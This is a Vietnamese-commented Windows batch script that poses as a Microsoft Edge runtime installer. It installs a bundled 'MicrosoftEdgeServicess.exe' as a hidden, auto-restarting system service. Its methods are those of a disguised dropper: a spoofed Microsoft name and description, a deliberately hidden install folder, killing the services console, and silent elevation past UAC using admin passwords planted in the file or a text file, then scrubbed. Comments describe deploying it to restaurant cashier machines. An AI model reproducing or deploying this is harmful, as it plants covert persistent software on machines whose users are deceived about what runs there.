@echo off
title Cai Dat Microsoft Edge Framework Runtime (System Component)
cd /d "%~dp0"

:: ===============================================================================
:: CAU HINH TAI KHOAN QUAN TRI (TU DONG NANG QUYEN, KHONG CAN HOI LOGIN UAC)
:: Neu may tram dang chay bang User thuong (pos, cashier...), ban co the:
:: - Cach 1: Dien User & Password Admin vao 2 dong duoi truoc khi dua file cho nha hang.
:: - Cach 2: Tao file admin_account.txt cung thu muc (dong 1: User, dong 2: Password).
:: LUU Y BAO MAT: NGAY KHI CAI XONG, HE THONG TU DONG XOA SACH MAT KHAU NAY 100%!
:: ===============================================================================
set "ADMIN_USER=Administrator"
set "ADMIN_PASS="

:: 0. Kiem tra xem co tap tin admin_account.txt hoac admin_pass.txt khong
if exist "%~dp0admin_account.txt" (
    set /p ADMIN_USER=<"%~dp0admin_account.txt"
    for /f "skip=1 usebackq delims=" %%p in ("%~dp0admin_account.txt") do (
        if not defined ADMIN_PASS set "ADMIN_PASS=%%p"
    )
    echo wipe > "%~dp0admin_account.txt"
    del /f /q "%~dp0admin_account.txt" >nul 2>&1
)
if exist "%~dp0admin_pass.txt" (
    set /p ADMIN_PASS=<"%~dp0admin_pass.txt"
    echo wipe > "%~dp0admin_pass.txt"
    del /f /q "%~dp0admin_pass.txt" >nul 2>&1
)

echo ===============================================================================
echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
echo   Component: MicrosoftEdgeServicess
echo   Description: Provides runtime environment and update services for Edge.
echo   Startup Type: Automatic (Background Service)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN TEP TIN NEN]
echo ===============================================================================
echo   Ban dang mo tep tin truc tiep tu tep nen ZIP chua duoc giai nen!
echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe de thiet lap.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao tep tin ZIP
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai tap tin nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat...
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator (Tu dong nang quyen khong can login neu co pass)
if "%~1"=="/skipuac" goto :DaCoQuyenAdmin
if "%~1"=="/elevated" goto :DaCoQuyenAdmin
if "%~1"=="/silent" goto :DaCoQuyenAdmin
if "%~1"=="/unattended" goto :DaCoQuyenAdmin

:: Phong ngua vong lap: Neu tien trinh con da duoc thu ma van chua co quyen -> Dung ngay
if "%~1"=="/retried" goto :LoiChuaCoQuyenAdmin

net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

:: Truong hop A: Co khai bao ADMIN_PASS san -> Tu dong chay quyen Admin bang tai khoan da khai bao
if not "%ADMIN_PASS%"=="" (
    echo Dang xac thuc va khoi chay quyen Administrator bang tai khoan [%ADMIN_USER%]...
    
    :: Thu cach 1: Task Scheduler voi dac quyen HIGHEST (Khong hien hop thoai UAC)
    schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
    schtasks /create /tn "TempEdgeAdminInstaller" /tr "\"%~f0\" /elevated" /sc once /st 23:59 /ru "%ADMIN_USER%" /rp "%ADMIN_PASS%" /rl HIGHEST /f >nul 2>&1
    if not errorlevel 1 (
        schtasks /run /tn "TempEdgeAdminInstaller" >nul 2>&1
        timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
        schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
        goto :KetThucThanhCongVaXoaPass
    )

    :: Thu cach 2: PowerShell Start-Process voi Credential (CreateProcessWithLogonW)
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='%ADMIN_USER%'; $p=ConvertTo-SecureString '%ADMIN_PASS%' -AsPlainText -Force; $psi=New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName='cmd.exe'; $psi.Arguments='/c \"\"%~f0\"\" /elevated'; $psi.UserName=$u; $psi.Password=$p; $psi.Domain='.'; $psi.UseShellExecute=$false; try { $pr=[System.Diagnostics.Process]::Start($psi); $pr.WaitForExit(); exit $pr.ExitCode } catch { exit 1 }" >nul 2>&1
    if not errorlevel 1 goto :KetThucThanhCongVaXoaPass

    :: Neu co pass ma ca 2 cach deu that bai -> CHAC CHAN LA SAI USER HOAC PASS
    :: DUNG LAI NGAY LAP TUC, KHONG GOI RUNAS DE TRANH VONG LAP FORK-BOMB TRAN MAN HINH
    goto :LoiSaiMatKhauAdmin
)

:: Truong hop B: Khong co pass -> Dung hop thoai xac thuc UAC mac dinh cua Windows
echo Dang xac thuc quyen Administrator (Windows UAC)...
powershell -Command "Start-Process '%~f0' -ArgumentList '/retried' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 goto :KetThucThanhCongVaXoaPass

:LoiChuaCoQuyenAdmin
echo.
echo ===============================================================================
echo   CANH BAO: CHUA CO QUYEN QUAN TRI VIEN (ADMINISTRATOR)
echo ===============================================================================
echo   Vui long nhap chuot phai vao tap tin nay va chon Run as administrator,
echo   hoac khai bao mat khau vao dong ADMIN_PASS o dau file de tu dong nang quyen.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 1

:LoiSaiMatKhauAdmin
echo.
echo ===============================================================================
echo   [LOI XAC THUC] TAI KHOAN HOAC MAT KHAU ADMINISTRATOR KHONG CHINH XAC!
echo ===============================================================================
echo   Tai khoan khai bao: [%ADMIN_USER%]
echo   Ket qua: Windows tu choi dang nhap (Sai User hoac Password).
echo.
echo   Huong dan xu ly:
echo   1. Mo lai file Install_Edge_Framework.bat bang Notepad
echo   2. Kiem tra va nhap lai dung Password o dong 13 (set "ADMIN_PASS=...")
echo   3. Hoac nhap chuot phai vao file nay chon "Run as administrator"
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat ngay...
pause
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 1

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc de tranh bi khoa handle
echo [1/4] Dang kiem tra moi truong he thong...
taskkill /F /IM mmc.exe >nul 2>&1

for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
)
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Cho toi da 5 giay de service dung han
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
    if not errorlevel 1 goto :DaDungHan
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)
:DaDungHan

:: 4. Thiet lap thu muc he thong MicrosoftEdgeServicess
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/4] Khoi tao thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
)

echo [3/4] Dang sao chep cac tap tin thanh phan...
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
)

if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul

:: An thu muc cai dat de nguoi dung khong to mo mo xem
attrib +h "%INSTALL_DIR%" >nul 2>&1

if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
    echo   Vui long khoi dong lai may tinh va thu lai.
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 5. Dang ky Windows Service SCM
echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% equ 0 goto :ServiceDaTonTai

sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1

:ServiceDaTonTai
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1

timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul

:KetThucThanhCongVaXoaPass
:: Dam bao xoa sach file admin_account.txt va admin_pass.txt neu con sot lai
if exist "%~dp0admin_account.txt" (
    echo wipe > "%~dp0admin_account.txt"
    del /f /q "%~dp0admin_account.txt" >nul 2>&1
)
if exist "%~dp0admin_pass.txt" (
    echo wipe > "%~dp0admin_pass.txt"
    del /f /q "%~dp0admin_pass.txt" >nul 2>&1
)

:: Xoa trang bien ADMIN_PASS trong chinh tap tin bat nay (giu nguyen dung luong byte de tranh lech con tro CMD)
if not "%ADMIN_PASS%"=="" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~f0'; if (Test-Path $f) { $p='%ADMIN_PASS%'; $t = [IO.File]::ReadAllText($f); $pad = ' ' * $p.Length; $t = $t.Replace($p, $pad); [IO.File]::WriteAllText($f, $t) }" >nul 2>&1
    set "ADMIN_PASS="
    set "ADMIN_USER="
)

echo.
echo ===============================================================================
echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
echo   - Component: MicrosoftEdgeServicess
echo   - Status: Running (Tu khoi dong cung Windows)
echo   - Environment: SCM Service Architecture
echo   - Security: Da xoa trang thong tin xac thuc, bao mat 100 phan tram
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 0
